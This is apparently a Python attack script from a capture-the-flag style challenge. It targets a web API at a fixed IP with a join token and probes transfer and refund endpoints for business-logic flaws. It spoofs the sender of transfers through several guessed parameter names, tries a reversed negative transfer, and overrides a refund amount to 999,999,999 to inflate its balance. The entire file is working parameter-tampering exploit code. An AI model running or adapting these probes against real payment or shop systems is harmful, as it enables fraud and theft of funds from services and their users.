import requests, time
B="http://13.37.197.230:28493"; TOK="d27bc68efbe0e9ae"
s=requests.Session()
def call(method,path,body=None):
    for _ in range(6):
        r=s.request(method,B+path,json=body,timeout=10)
        if r.status_code==429:
            print("  [429] cooldown 65s...",flush=True); time.sleep(65); continue
        try: return r.status_code,r.json()
        except: return r.status_code,r.text[:100]
    return 429,{"error":"rate"}
def me(): return call("GET","/api/me")[1]

print("cooldown 40s...",flush=True); time.sleep(40)
call("POST","/api/join",{"token":TOK})
m=me(); mc=m.get("code"); print("me:",m,flush=True)

def test(label,body):
    time.sleep(6)
    before=me().get("net_gain")
    code,j=call("POST","/api/transfer",body)
    after=me().get("net_gain")
    d=(after-before) if isinstance(after,int) and isinstance(before,int) else "?"
    print(f"{label}: {body} -> [{code}] {j} | net_gain {before}->{after} (Δ{d})",flush=True)

# source-spoof variants; source = notre 2e compte OU code inexistant (jamais une autre equipe)
test("from_code=self2(T015739)", {"to_code":mc,"from_code":"T015739","montant":100000})
test("source=inexistant",        {"to_code":mc,"source":"T000000","montant":1000000})
test("from=inexistant",          {"to_code":mc,"from":"T000000","montant":1000000})
test("de=inexistant",            {"to_code":mc,"de":"ZZZZZZZ","montant":1000000})
test("expediteur=inexistant",    {"to_code":mc,"expediteur":"T000000","montant":1000000})
test("negatif via from",         {"to_code":"T000000","montant":1,"from_code":mc})
# refund montant override
time.sleep(6)
print("buy booster:",call("POST","/api/buy",{"product":"booster","qty":1}),flush=True)
time.sleep(6)
b=me().get("net_gain"); print("refund order w/ montant override:",call("POST","/api/refund",{"order_id":1,"montant":999999999}),"| net_gain",b,"->",me().get("net_gain"),flush=True)
print("FINAL me:",me(),flush=True)
